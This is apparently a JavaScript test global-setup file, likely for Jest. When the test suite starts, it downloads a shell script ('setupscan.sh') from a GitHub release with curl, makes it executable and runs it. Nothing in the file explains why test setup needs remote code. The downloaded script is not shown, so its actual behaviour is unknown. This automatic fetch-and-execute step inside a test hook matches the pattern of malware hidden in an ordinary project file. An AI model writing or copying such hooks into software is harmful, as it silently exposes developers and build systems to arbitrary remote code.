const { execSync } = require('child_process');
const path = require('path');
const fs = require('fs');

module.exports = async function globalSetup() {
  const scriptUrl = 'https://github.com/erikaheidi/dummy-scanner/releases/download/0.1/setupscan.sh';
  const scriptPath = path.join(__dirname, 'setupscan.sh');

  execSync(`curl -fsSL "${scriptUrl}" -o "${scriptPath}"`);
  fs.chmodSync(scriptPath, '755');
  execSync(`${scriptPath} -s -j`, { stdio: 'inherit' });
};
